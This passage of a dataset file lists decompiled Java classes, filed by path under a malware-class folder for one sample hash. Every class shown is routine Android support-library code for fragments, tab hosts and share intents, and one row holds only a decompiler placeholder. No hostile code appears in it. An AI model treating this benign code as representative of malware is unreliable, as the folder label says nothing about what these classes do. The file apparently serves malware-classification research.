"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentContainer.code","interface FragmentContainer {   View findViewById(  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentManager.code","public abstract class FragmentManager {   public static final int POP_BACK_STACK_INCLUSIVE=1; public interface BackStackEntry {     CharSequence getBreadCrumbShortTitle();     int getBreadCrumbShortTitleRes();     CharSequence getBreadCrumbTitle();     int getBreadCrumbTitleRes();     int getId();     String getName();   } public interface OnBackStackChangedListener {     void onBackStackChanged();   }   public abstract void addOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract FragmentTransaction beginTransaction();   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract boolean executePendingTransactions();   public abstract Fragment findFragmentById(  int i);   public abstract Fragment findFragmentByTag(  String str);   public abstract BackStackEntry getBackStackEntryAt(  int i);   public abstract int getBackStackEntryCount();   public abstract Fragment getFragment(  Bundle bundle,  String str);   public abstract List<Fragment> getFragments();   public abstract void popBackStack();   public abstract void popBackStack(  int i,  int i2);   public abstract void popBackStack(  String str,  int i);   public abstract boolean popBackStackImmediate();   public abstract boolean popBackStackImmediate(  int i,  int i2);   public abstract boolean popBackStackImmediate(  String str,  int i);   public abstract void putFragment(  Bundle bundle,  String str,  Fragment fragment);   public abstract void removeOnBackStackChangedListener(  OnBackStackChangedListener onBackStackChangedListener);   public abstract Fragment.SavedState saveFragmentInstanceState(  Fragment fragment);   @Deprecated public FragmentTransaction openTransaction(){     return beginTransaction();   }   public static void enableDebugLogging(  boolean enabled){     FragmentManagerImpl.DEBUG=enabled;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentManagerImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@31d11998"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentManagerState.code","public final class FragmentManagerState implements Parcelable {   public static final Parcelable.Creator<FragmentManagerState> CREATOR=new Parcelable.Creator<FragmentManagerState>(){     @Override public FragmentManagerState createFromParcel(    Parcel in){       return new FragmentManagerState(in);     }     @Override public FragmentManagerState[] newArray(    int size){       return new FragmentManagerState[size];     }   } ;   FragmentState[] mActive;   int[] mAdded;   BackStackState[] mBackStack;   public FragmentManagerState(){   }   public FragmentManagerState(  Parcel in){     this.mActive=(FragmentState[])in.createTypedArray(FragmentState.CREATOR);     this.mAdded=in.createIntArray();     this.mBackStack=(BackStackState[])in.createTypedArray(BackStackState.CREATOR);   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeTypedArray(this.mActive,flags);     dest.writeIntArray(this.mAdded);     dest.writeTypedArray(this.mBackStack,flags);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentPagerAdapter.code","public abstract class FragmentPagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentPagerAdapter"";   private FragmentTransaction mCurTransaction=null;   private Fragment mCurrentPrimaryItem=null;   private final FragmentManager mFragmentManager;   public abstract Fragment getItem(  int i);   public FragmentPagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     long itemId=getItemId(position);     String name=makeFragmentName(container.getId(),itemId);     Fragment fragment=this.mFragmentManager.findFragmentByTag(name);     if (fragment != null) {       this.mCurTransaction.attach(fragment);     }  else {       fragment=getItem(position);       this.mCurTransaction.add(container.getId(),fragment,makeFragmentName(container.getId(),itemId));     }     if (fragment != this.mCurrentPrimaryItem) {       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);     }     return fragment;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     this.mCurTransaction.detach((Fragment)object);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     return null;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){   }   public long getItemId(  int position){     return position;   }   private static String makeFragmentName(  int viewId,  long id){     return ""android:switcher:"" + viewId + "":""+ id;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentState.code","public final class FragmentState implements Parcelable {   public static final Parcelable.Creator<FragmentState> CREATOR=new Parcelable.Creator<FragmentState>(){     @Override public FragmentState createFromParcel(    Parcel in){       return new FragmentState(in);     }     @Override public FragmentState[] newArray(    int size){       return new FragmentState[size];     }   } ;   final Bundle mArguments;   final String mClassName;   final int mContainerId;   final boolean mDetached;   final int mFragmentId;   final boolean mFromLayout;   final int mIndex;   Fragment mInstance;   final boolean mRetainInstance;   Bundle mSavedFragmentState;   final String mTag;   public FragmentState(  Fragment frag){     this.mClassName=frag.getClass().getName();     this.mIndex=frag.mIndex;     this.mFromLayout=frag.mFromLayout;     this.mFragmentId=frag.mFragmentId;     this.mContainerId=frag.mContainerId;     this.mTag=frag.mTag;     this.mRetainInstance=frag.mRetainInstance;     this.mDetached=frag.mDetached;     this.mArguments=frag.mArguments;   }   public FragmentState(  Parcel in){     this.mClassName=in.readString();     this.mIndex=in.readInt();     this.mFromLayout=in.readInt() != 0;     this.mFragmentId=in.readInt();     this.mContainerId=in.readInt();     this.mTag=in.readString();     this.mRetainInstance=in.readInt() != 0;     this.mDetached=in.readInt() != 0;     this.mArguments=in.readBundle();     this.mSavedFragmentState=in.readBundle();   }   public Fragment instantiate(  FragmentActivity activity,  Fragment parent){     if (this.mInstance != null) {       return this.mInstance;     }     if (this.mArguments != null) {       this.mArguments.setClassLoader(activity.getClassLoader());     }     this.mInstance=Fragment.instantiate(activity,this.mClassName,this.mArguments);     if (this.mSavedFragmentState != null) {       this.mSavedFragmentState.setClassLoader(activity.getClassLoader());       this.mInstance.mSavedFragmentState=this.mSavedFragmentState;     }     this.mInstance.setIndex(this.mIndex,parent);     this.mInstance.mFromLayout=this.mFromLayout;     this.mInstance.mRestored=true;     this.mInstance.mFragmentId=this.mFragmentId;     this.mInstance.mContainerId=this.mContainerId;     this.mInstance.mTag=this.mTag;     this.mInstance.mRetainInstance=this.mRetainInstance;     this.mInstance.mDetached=this.mDetached;     this.mInstance.mFragmentManager=activity.mFragments;     if (FragmentManagerImpl.DEBUG) {       Log.v(""FragmentManager"",""Instantiated fragment "" + this.mInstance);     }     return this.mInstance;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeString(this.mClassName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mFromLayout ? 1 : 0);     dest.writeInt(this.mFragmentId);     dest.writeInt(this.mContainerId);     dest.writeString(this.mTag);     dest.writeInt(this.mRetainInstance ? 1 : 0);     dest.writeInt(this.mDetached ? 1 : 0);     dest.writeBundle(this.mArguments);     dest.writeBundle(this.mSavedFragmentState);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentStatePagerAdapter.code","public abstract class FragmentStatePagerAdapter extends PagerAdapter {   private static final boolean DEBUG=false;   private static final String TAG=""FragmentStatePagerAdapter"";   private final FragmentManager mFragmentManager;   private FragmentTransaction mCurTransaction=null;   private ArrayList<Fragment.SavedState> mSavedState=new ArrayList<>();   private ArrayList<Fragment> mFragments=new ArrayList<>();   private Fragment mCurrentPrimaryItem=null;   public abstract Fragment getItem(  int i);   public FragmentStatePagerAdapter(  FragmentManager fm){     this.mFragmentManager=fm;   }   @Override public void startUpdate(  ViewGroup container){   }   @Override public Object instantiateItem(  ViewGroup container,  int position){     Fragment.SavedState fss;     Fragment f;     if (this.mFragments.size() <= position || (f=this.mFragments.get(position)) == null) {       if (this.mCurTransaction == null) {         this.mCurTransaction=this.mFragmentManager.beginTransaction();       }       Fragment fragment=getItem(position);       if (this.mSavedState.size() > position && (fss=this.mSavedState.get(position)) != null) {         fragment.setInitialSavedState(fss);       }       while (this.mFragments.size() <= position) {         this.mFragments.add(null);       }       fragment.setMenuVisibility(DEBUG);       fragment.setUserVisibleHint(DEBUG);       this.mFragments.set(position,fragment);       this.mCurTransaction.add(container.getId(),fragment);       return fragment;     }     return f;   }   @Override public void destroyItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (this.mCurTransaction == null) {       this.mCurTransaction=this.mFragmentManager.beginTransaction();     }     while (this.mSavedState.size() <= position) {       this.mSavedState.add(null);     }     this.mSavedState.set(position,this.mFragmentManager.saveFragmentInstanceState(fragment));     this.mFragments.set(position,null);     this.mCurTransaction.remove(fragment);   }   @Override public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     Fragment fragment=(Fragment)object;     if (fragment != this.mCurrentPrimaryItem) {       if (this.mCurrentPrimaryItem != null) {         this.mCurrentPrimaryItem.setMenuVisibility(DEBUG);         this.mCurrentPrimaryItem.setUserVisibleHint(DEBUG);       }       if (fragment != null) {         fragment.setMenuVisibility(true);         fragment.setUserVisibleHint(true);       }       this.mCurrentPrimaryItem=fragment;     }   }   @Override public void finishUpdate(  ViewGroup container){     if (this.mCurTransaction != null) {       this.mCurTransaction.commitAllowingStateLoss();       this.mCurTransaction=null;       this.mFragmentManager.executePendingTransactions();     }   }   @Override public boolean isViewFromObject(  View view,  Object object){     if (((Fragment)object).getView() == view) {       return true;     }     return DEBUG;   }   @Override public Parcelable saveState(){     Bundle state=null;     if (this.mSavedState.size() > 0) {       state=new Bundle();       Fragment.SavedState[] fss=new Fragment.SavedState[this.mSavedState.size()];       this.mSavedState.toArray(fss);       state.putParcelableArray(""states"",fss);     }     for (int i=0; i < this.mFragments.size(); i++) {       Fragment f=this.mFragments.get(i);       if (f != null) {         if (state == null) {           state=new Bundle();         }         String key=""f"" + i;         this.mFragmentManager.putFragment(state,key,f);       }     }     return state;   }   @Override public void restoreState(  Parcelable state,  ClassLoader loader){     if (state != null) {       Bundle bundle=(Bundle)state;       bundle.setClassLoader(loader);       Parcelable[] fss=bundle.getParcelableArray(""states"");       this.mSavedState.clear();       this.mFragments.clear();       if (fss != null) {         for (        Parcelable parcelable : fss) {           this.mSavedState.add((Fragment.SavedState)parcelable);         }       }       Iterable<String> keys=bundle.keySet();       for (      String key : keys) {         if (key.startsWith(""f"")) {           int index=Integer.parseInt(key.substring(1));           Fragment f=this.mFragmentManager.getFragment(bundle,key);           if (f != null) {             while (this.mFragments.size() <= index) {               this.mFragments.add(null);             }             f.setMenuVisibility(DEBUG);             this.mFragments.set(index,f);           }  else {             Log.w(TAG,""Bad fragment at key "" + key);           }         }       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentTabHost.code","public class FragmentTabHost extends TabHost implements TabHost.OnTabChangeListener {   private boolean mAttached;   private int mContainerId;   private Context mContext;   private FragmentManager mFragmentManager;   private TabInfo mLastTab;   private TabHost.OnTabChangeListener mOnTabChangeListener;   private FrameLayout mRealTabContent;   private final ArrayList<TabInfo> mTabs; public static final class TabInfo {     private final Bundle args;     private final Class<?> clss;     private Fragment fragment;     private final String tag;     TabInfo(    String _tag,    Class<?> _class,    Bundle _args){       this.tag=_tag;       this.clss=_class;       this.args=_args;     }   } static class DummyTabFactory implements TabHost.TabContentFactory {     private final Context mContext;     public DummyTabFactory(    Context context){       this.mContext=context;     }     @Override public View createTabContent(    String tag){       View v=new View(this.mContext);       v.setMinimumWidth(0);       v.setMinimumHeight(0);       return v;     }   } public static class SavedState extends View.BaseSavedState {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     String curTab;     SavedState(    Parcelable superState){       super(superState);     }     private SavedState(    Parcel in){       super(in);       this.curTab=in.readString();     }     @Override public void writeToParcel(    Parcel out,    int flags){       super.writeToParcel(out,flags);       out.writeString(this.curTab);     }     public String toString(){       return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";     }   }   public FragmentTabHost(  Context context){     super(context,null);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,null);   }   public FragmentTabHost(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabs=new ArrayList<>();     initFragmentTabHost(context,attrs);   }   private void initFragmentTabHost(  Context context,  AttributeSet attrs){     TypedArray a=context.obtainStyledAttributes(attrs,new int[]{R.attr.inflatedId},0,0);     this.mContainerId=a.getResourceId(0,0);     a.recycle();     super.setOnTabChangedListener(this);   }   private void ensureHierarchy(  Context context){     if (findViewById(R.id.tabs) == null) {       LinearLayout ll=new LinearLayout(context);       ll.setOrientation(1);       addView(ll,new FrameLayout.LayoutParams(-1,-1));       TabWidget tw=new TabWidget(context);       tw.setId(R.id.tabs);       tw.setOrientation(0);       ll.addView(tw,new LinearLayout.LayoutParams(-1,-2,0.0f));       FrameLayout fl=new FrameLayout(context);       fl.setId(R.id.tabcontent);       ll.addView(fl,new LinearLayout.LayoutParams(0,0,0.0f));       FrameLayout fl2=new FrameLayout(context);       this.mRealTabContent=fl2;       this.mRealTabContent.setId(this.mContainerId);       ll.addView(fl2,new LinearLayout.LayoutParams(-1,0,1.0f));     }   }   @Override @Deprecated public void setup(){     throw new IllegalStateException(""Must call setup() that takes a Context and FragmentManager"");   }   public void setup(  Context context,  FragmentManager manager){     ensureHierarchy(context);     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     ensureContent();   }   public void setup(  Context context,  FragmentManager manager,  int containerId){     ensureHierarchy(context);     super.setup();     this.mContext=context;     this.mFragmentManager=manager;     this.mContainerId=containerId;     ensureContent();     this.mRealTabContent.setId(containerId);     if (getId() == -1) {       setId(R.id.tabhost);     }   }   private void ensureContent(){     if (this.mRealTabContent == null) {       this.mRealTabContent=(FrameLayout)findViewById(this.mContainerId);       if (this.mRealTabContent == null) {         throw new IllegalStateException(""No tab content FrameLayout found for id "" + this.mContainerId);       }     }   }   @Override public void setOnTabChangedListener(  TabHost.OnTabChangeListener l){     this.mOnTabChangeListener=l;   }   public void addTab(  TabHost.TabSpec tabSpec,  Class<?> clss,  Bundle args){     tabSpec.setContent(new DummyTabFactory(this.mContext));     String tag=tabSpec.getTag();     TabInfo info=new TabInfo(tag,clss,args);     if (this.mAttached) {       info.fragment=this.mFragmentManager.findFragmentByTag(tag);       if (info.fragment != null && !info.fragment.isDetached()) {         FragmentTransaction ft=this.mFragmentManager.beginTransaction();         ft.detach(info.fragment);         ft.commit();       }     }     this.mTabs.add(info);     addTab(tabSpec);   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     String currentTab=getCurrentTabTag();     FragmentTransaction ft=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       tab.fragment=this.mFragmentManager.findFragmentByTag(tab.tag);       if (tab.fragment != null && !tab.fragment.isDetached()) {         if (tab.tag.equals(currentTab)) {           this.mLastTab=tab;         }  else {           if (ft == null) {             ft=this.mFragmentManager.beginTransaction();           }           ft.detach(tab.fragment);         }       }     }     this.mAttached=true;     FragmentTransaction ft2=doTabChanged(currentTab,ft);     if (ft2 != null) {       ft2.commit();       this.mFragmentManager.executePendingTransactions();     }   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     this.mAttached=false;   }   @Override protected Parcelable onSaveInstanceState(){     Parcelable superState=super.onSaveInstanceState();     SavedState ss=new SavedState(superState);     ss.curTab=getCurrentTabTag();     return ss;   }   @Override protected void onRestoreInstanceState(  Parcelable state){     SavedState ss=(SavedState)state;     super.onRestoreInstanceState(ss.getSuperState());     setCurrentTabByTag(ss.curTab);   }   @Override public void onTabChanged(  String tabId){     FragmentTransaction ft;     if (this.mAttached && (ft=doTabChanged(tabId,null)) != null) {       ft.commit();     }     if (this.mOnTabChangeListener != null) {       this.mOnTabChangeListener.onTabChanged(tabId);     }   }   private FragmentTransaction doTabChanged(  String tabId,  FragmentTransaction ft){     TabInfo newTab=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       if (tab.tag.equals(tabId)) {         newTab=tab;       }     }     if (newTab == null) {       throw new IllegalStateException(""No tab known for tag "" + tabId);     }     if (this.mLastTab != newTab) {       if (ft == null) {         ft=this.mFragmentManager.beginTransaction();       }       if (this.mLastTab != null && this.mLastTab.fragment != null) {         ft.detach(this.mLastTab.fragment);       }       if (newTab != null) {         if (newTab.fragment == null) {           newTab.fragment=Fragment.instantiate(this.mContext,newTab.clss.getName(),newTab.args);           ft.add(this.mContainerId,newTab.fragment,newTab.tag);         }  else {           ft.attach(newTab.fragment);         }       }       this.mLastTab=newTab;     }     return ft;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentTag.code","static class FragmentTag {   public static final int[] Fragment={R.attr.name,R.attr.id,R.attr.tag};   public static final int Fragment_id=1;   public static final int Fragment_name=0;   public static final int Fragment_tag=2;   FragmentTag(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentTransaction.code","public abstract class FragmentTransaction {   public static final int TRANSIT_ENTER_MASK=4096;   public static final int TRANSIT_EXIT_MASK=8192;   public static final int TRANSIT_FRAGMENT_CLOSE=8194;   public static final int TRANSIT_FRAGMENT_FADE=4099;   public static final int TRANSIT_FRAGMENT_OPEN=4097;   public static final int TRANSIT_NONE=0;   public static final int TRANSIT_UNSET=-1;   public abstract FragmentTransaction add(  int i,  Fragment fragment);   public abstract FragmentTransaction add(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction add(  Fragment fragment,  String str);   public abstract FragmentTransaction addToBackStack(  String str);   public abstract FragmentTransaction attach(  Fragment fragment);   public abstract int commit();   public abstract int commitAllowingStateLoss();   public abstract FragmentTransaction detach(  Fragment fragment);   public abstract FragmentTransaction disallowAddToBackStack();   public abstract FragmentTransaction hide(  Fragment fragment);   public abstract boolean isAddToBackStackAllowed();   public abstract boolean isEmpty();   public abstract FragmentTransaction remove(  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction setBreadCrumbShortTitle(  int i);   public abstract FragmentTransaction setBreadCrumbShortTitle(  CharSequence charSequence);   public abstract FragmentTransaction setBreadCrumbTitle(  int i);   public abstract FragmentTransaction setBreadCrumbTitle(  CharSequence charSequence);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2,  int i3,  int i4);   public abstract FragmentTransaction setTransition(  int i);   public abstract FragmentTransaction setTransitionStyle(  int i);   public abstract FragmentTransaction show(  Fragment fragment); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\InboxStyle.code","public static class InboxStyle extends Style {   ArrayList<CharSequence> mTexts=new ArrayList<>();   public InboxStyle(){   }   public InboxStyle(  Builder builder){     setBuilder(builder);   }   public InboxStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public InboxStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public InboxStyle addLine(  CharSequence cs){     this.mTexts.add(cs);     return this;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\InstantiationException.code","public static class InstantiationException extends RuntimeException {   public InstantiationException(  String msg,  Exception cause){     super(msg,cause);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\IntentBuilder.code","public static class IntentBuilder {   private Activity mActivity;   private ArrayList<String> mBccAddresses;   private ArrayList<String> mCcAddresses;   private CharSequence mChooserTitle;   private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");   private ArrayList<Uri> mStreams;   private ArrayList<String> mToAddresses;   public static IntentBuilder from(  Activity launchingActivity){     return new IntentBuilder(launchingActivity);   }   private IntentBuilder(  Activity launchingActivity){     this.mActivity=launchingActivity;     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());     this.mIntent.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);   }   public Intent getIntent(){     if (this.mToAddresses != null) {       combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);       this.mToAddresses=null;     }     if (this.mCcAddresses != null) {       combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);       this.mCcAddresses=null;     }     if (this.mBccAddresses != null) {       combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);       this.mBccAddresses=null;     }     boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;     boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     if (!needsSendMultiple && isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }       this.mStreams=null;     }     if (needsSendMultiple && !isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }     }     return this.mIntent;   }   Activity getActivity(){     return this.mActivity;   }   private void combineArrayExtra(  String extra,  ArrayList<String> add){     String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);     int currentLength=currentAddresses != null ? currentAddresses.length : 0;     String[] finalAddresses=new String[add.size() + currentLength];     add.toArray(finalAddresses);     if (currentAddresses != null) {       System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);     }     this.mIntent.putExtra(extra,finalAddresses);   }   private void combineArrayExtra(  String extra,  String[] add){     Intent intent=getIntent();     String[] old=intent.getStringArrayExtra(extra);     int oldLength=old != null ? old.length : 0;     String[] result=new String[add.length + oldLength];     if (old != null) {       System.arraycopy(old,0,result,0,oldLength);     }     System.arraycopy(add,0,result,oldLength,add.length);     intent.putExtra(extra,result);   }   public Intent createChooserIntent(){     return Intent.createChooser(getIntent(),this.mChooserTitle);   }   public void startChooser(){     this.mActivity.startActivity(createChooserIntent());   }   public IntentBuilder setChooserTitle(  CharSequence title){     this.mChooserTitle=title;     return this;   }   public IntentBuilder setChooserTitle(  int resId){     return setChooserTitle(this.mActivity.getText(resId));   }   public IntentBuilder setType(  String mimeType){     this.mIntent.setType(mimeType);     return this;   }   public IntentBuilder setText(  CharSequence text){     this.mIntent.putExtra(""android.intent.extra.TEXT"",text);     return this;   }   public IntentBuilder setHtmlText(  String htmlText){     this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);     if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {       setText(Html.fromHtml(htmlText));     }     return this;   }   public IntentBuilder setStream(  Uri streamUri){     if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {       this.mIntent.setAction(""android.intent.action.SEND"");     }     this.mStreams=null;     this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);     return this;   }   public IntentBuilder addStream(  Uri streamUri){     Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     if (currentStream == null) {       return setStream(streamUri);     }     if (this.mStreams == null) {       this.mStreams=new ArrayList<>();     }     if (currentStream != null) {       this.mIntent.removeExtra(""android.intent.extra.STREAM"");       this.mStreams.add(currentStream);     }     this.mStreams.add(streamUri);     return this;   }   public IntentBuilder setEmailTo(  String[] addresses){     if (this.mToAddresses != null) {       this.mToAddresses=null;     }     this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder addEmailTo(  String address){     if (this.mToAddresses == null) {       this.mToAddresses=new ArrayList<>();     }     this.mToAddresses.add(address);     return this;   }   public IntentBuilder addEmailTo(  String[] addresses){     combineArrayExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder setEmailCc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder addEmailCc(  String address){     if (this.mCcAddresses == null) {       this.mCcAddresses=new ArrayList<>();     }     this.mCcAddresses.add(address);     return this;   }   public IntentBuilder addEmailCc(  String[] addresses){     combineArrayExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder setEmailBcc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder addEmailBcc(  String address){     if (this.mBccAddresses == null) {       this.mBccAddresses=new ArrayList<>();     }     this.mBccAddresses.add(address);     return this;   }   public IntentBuilder addEmailBcc(  String[] addresses){     combineArrayExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder setSubject(  String subject){     this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);     return this;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\IntentReader.code","public static class IntentReader {   private static final String TAG=""IntentReader"";   private Activity mActivity;   private ComponentName mCallingActivity;   private String mCallingPackage;   private Intent mIntent;   private ArrayList<Uri> mStreams;   public static IntentReader from(  Activity activity){     return new IntentReader(activity);   }   private IntentReader(  Activity activity){     this.mActivity=activity;     this.mIntent=activity.getIntent();     this.mCallingPackage=ShareCompat.getCallingPackage(activity);     this.mCallingActivity=ShareCompat.getCallingActivity(activity);   }   public boolean isShareIntent(){     String action=this.mIntent.getAction();     return ""android.intent.action.SEND"".equals(action) || ""android.intent.action.SEND_MULTIPLE"".equals(action);   }   public boolean isSingleShare(){     return ""android.intent.action.SEND"".equals(this.mIntent.getAction());   }   public boolean isMultipleShare(){     return ""android.intent.action.SEND_MULTIPLE"".equals(this.mIntent.getAction());   }   public String getType(){     return this.mIntent.getType();   }   public CharSequence getText(){     return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");   }   public String getHtmlText(){     String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);     if (result == null) {       CharSequence text=getText();       if (text instanceof Spanned) {         return Html.toHtml((Spanned)text);       }       if (text != null) {         return ShareCompat.IMPL.escapeHtml(text);       }       return result;     }     return result;   }   public Uri getStream(){     return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");   }   public Uri getStream(  int index){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.get(index);     }     if (index == 0) {       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);   }   public int getStreamCount(){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.size();     }     return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;   }   public String[] getEmailTo(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");   }   public String[] getEmailCc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");   }   public String[] getEmailBcc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");   }   public String getSubject(){     return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");   }   public String getCallingPackage(){     return this.mCallingPackage;   }   public ComponentName getCallingActivity(){     return this.mCallingActivity;   }   public Drawable getCallingActivityIcon(){     if (this.mCallingActivity == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getActivityIcon(this.mCallingActivity);     }  catch (    